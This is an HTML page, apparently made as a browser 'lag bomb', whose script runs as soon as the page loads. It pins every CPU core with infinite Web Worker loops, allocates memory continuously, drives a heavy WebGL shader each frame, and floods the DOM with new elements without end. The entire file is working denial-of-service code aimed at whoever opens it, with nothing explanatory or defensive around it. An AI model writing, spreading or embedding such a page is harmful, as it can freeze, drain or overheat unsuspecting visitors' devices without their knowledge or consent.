<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Лаги без краха</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
        }
        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
    </style>
</head>
<body>
    <canvas id="canvas"></canvas>
    <script>
        // 1. Нагрузка на CPU через Web Workers
        function overloadCPU() {
            const workerCode = `
                onmessage = function() {
                    while (true) {
                        let x = 0;
                        for (let i = 0; i < 1000000; i++) {
                            x += Math.sin(Math.random());
                        }
                    }
                };
            `;
            for (let i = 0; i < navigator.hardwareConcurrency; i++) {
                try {
                    const blob = new Blob([workerCode], { type: "application/javascript" });
                    const worker = new Worker(URL.createObjectURL(blob));
                    worker.postMessage("start");
                } catch (e) {
                    setInterval(() => {
                        let x = 0;
                        for (let i = 0; i < 1000000; i++) {
                            x += Math.sin(Math.random());
                        }
                    }, 10);
                }
            }
        }

        // 2. Нагрузка на память
        function overloadMemory() {
            let memorySink = [];
            function leak() {
                for (let i = 0; i < 100; i++) {
                    memorySink.push(new Uint32Array(1000000)); // 4 МБ на массив
                }
                if (memorySink.length > 1000) memorySink = []; // Очистка, чтобы не исчерпать память
                setTimeout(leak, 100);
            }
            leak();
        }

        // 3. Нагрузка на GPU через WebGL
        function overloadGPU() {
            const canvas = document.getElementById("canvas");
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            if (!gl) return;

            const vsSource = `
                attribute vec4 aPosition;
                void main() {
                    gl_Position = aPosition;
                }
            `;
            const fsSource = `
                precision highp float;
                uniform float uTime;
                void main() {
                    float r = 0.0;
                    for (int i = 0; i < 1000; i++) {
                        r += sin(float(i) * uTime * 0.01);
                    }
                    gl_FragColor = vec4(mod(r, 1.0), 0.5, 0.5, 1.0);
                }
            `;

            const vertexShader = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vertexShader, vsSource);
            gl.compileShader(vertexShader);
            const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(fragmentShader, fsSource);
            gl.compileShader(fragmentShader);
            const program = gl.createProgram();
            gl.attachShader(program, vertexShader);
            gl.attachShader(program, fragmentShader);
            gl.linkProgram(program);
            gl.useProgram(program);

            const positionBuffer = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);

            const aPosition = gl.getAttribLocation(program, "aPosition");
            gl.enableVertexAttribArray(aPosition);
            gl.vertexAttribPointer(aPosition, 2, gl.FLOAT, false, 0, 0);

            const uTime = gl.getUniformLocation(program, "uTime");
            function render() {
                gl.uniform1f(uTime, performance.now() / 1000);
                gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                requestAnimationFrame(render);
            }
            render();
        }

        // 4. Нагрузка на DOM
        function overloadDOM() {
            function createChaos() {
                for (let i = 0; i < 100; i++) {
                    const div = document.createElement("div");
                    div.style.position = "absolute";
                    div.style.left = Math.random() * 100 + "%";
                    div.style.top = Math.random() * 100 + "%";
                    div.style.width = "50px";
                    div.style.height = "50px";
                    div.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
                    document.body.appendChild(div);
                }
                setTimeout(createChaos, 100);
            }
            createChaos();
        }

        // Запускаем все
        overloadCPU();
        overloadMemory();
        overloadGPU();
        overloadDOM();
    </script>
</body>
</html>
